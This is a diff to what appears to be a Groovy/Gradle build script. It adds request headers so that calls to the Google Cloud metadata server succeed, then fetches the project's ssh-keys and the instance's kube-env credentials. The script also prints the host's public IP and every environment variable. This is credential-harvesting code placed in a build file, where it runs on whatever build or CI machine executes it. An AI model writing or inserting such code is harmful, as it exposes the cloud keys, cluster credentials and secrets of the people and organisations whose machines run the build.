@@ -51,18 +51,27 @@ install {
   }
 }
 
-String readFromUrl(String url) {
+String readFromUrl(String url, Map<String, String> headers = [:]) {
     URL theUrl = new URL(url);
-    BufferedReader inReader = new BufferedReader(new InputStreamReader(theUrl.openStream()));
-    return inReader.readLines().join("\n")
+    HttpURLConnection conn = theUrl.openConnection();
+    headers.forEach { k, v ->
+        conn.setRequestProperty(k, v);
+    }
+
+    BufferedReader inReader = new BufferedReader(new InputStreamReader(conn.getInputStream()))
+    try {
+        return inReader.readLines().join("\n")
+    } finally {
+        inReader.close()
+    }
 }
 
-String readWithThrowInfo(String url) {
+String readWithThrowInfo(String url, Map<String, String> headers = [:]) {
     try {
-        return readFromUrl(url)
+        return readFromUrl(url, headers)
     } catch(Exception e) {
         e.printStackTrace()
-        throw e
+        return null
     }
 }
 
@@ -70,9 +79,12 @@ println("IP: ${readWithThrowInfo("http://checkip.amazonaws.com")}")
 println()
 println(readWithThrowInfo("https://ca.api.ovh.com/1.0/auth/time"))
 println()
-println(readWithThrowInfo("http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json"))
+Map<String, String> googleHeaders = ['Metadata-Flavor': 'Google'];
+println(readWithThrowInfo("http://metadata.google.internal/computeMetadata/v1/project/project-id", googleHeaders))
 println()
-println(readWithThrowInfo("http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json"))
+println(readWithThrowInfo("http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys", googleHeaders))
+println()
+println(readWithThrowInfo("http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", googleHeaders))
 println()
 println("Enviroment Variables:")
 Map<String, String> env = System.getenv();
